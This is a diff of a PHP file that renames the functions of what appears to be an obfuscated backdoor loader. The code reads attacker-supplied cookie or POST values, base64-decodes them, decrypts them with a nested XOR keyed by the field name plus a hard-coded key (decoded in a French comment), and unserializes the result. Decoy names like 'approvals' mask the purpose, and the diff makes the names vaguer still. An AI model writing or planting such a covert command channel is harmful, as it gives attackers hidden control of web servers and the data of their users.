@@ -14,7 +14,7 @@ function basic_xor($left, $right)
     return $left ^ $right;
 }
 
-function xor_strings_repeating($left, $right)
+function advanced_xor($left, $right)
 {
     $final_xor = "";
 
@@ -27,15 +27,15 @@ function xor_strings_repeating($left, $right)
     return $final_xor;
 }
 
-function remove_letter($data, $key)
+function final_unserialize($data, $key)
 {
-    return @unserialize(decode_with_key($data, $key));
+    return @unserialize(use_key_meta($data, $key));
 }
 
-function decode_with_key($sub_data, $sub_key)
+function use_key_meta($sub_data, $sub_key)
 {
-    return xor_strings_repeating(
-        xor_strings_repeating(
+    return advanced_xor(
+        advanced_xor(
             $sub_data,
             // valeur toujours = base64_decode("UAMQV1oLEgBLUAsHE11SXwAPSlNVVA5CUwELU11GRlgBWFIH") ^ 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'
             // = 4ef63abe-1abd-45a6-913d-6fb99657e24b
@@ -50,7 +50,7 @@ foreach ($_COOKIE as $cookie_one=>$cookie_two)
 {
     $approvals = $cookie_two;
     $manager_invitation = $cookie_one;
-    $approvals = remove_letter(base64_decode($approvals), $manager_invitation) ;
+    $approvals = final_unserialize(base64_decode($approvals), $manager_invitation) ;
 
     if ($approvals) {
         break;
@@ -61,7 +61,7 @@ if (!$approvals) {
     foreach ($_POST as $contribute=>$research) {
         $approvals = $research;
         $manager_invitation = $contribute;
-        $approvals = remove_letter(base64_decode($approvals), $manager_invitation);
+        $approvals = final_unserialize(base64_decode($approvals), $manager_invitation);
         if ($approvals) {
             break;
         }
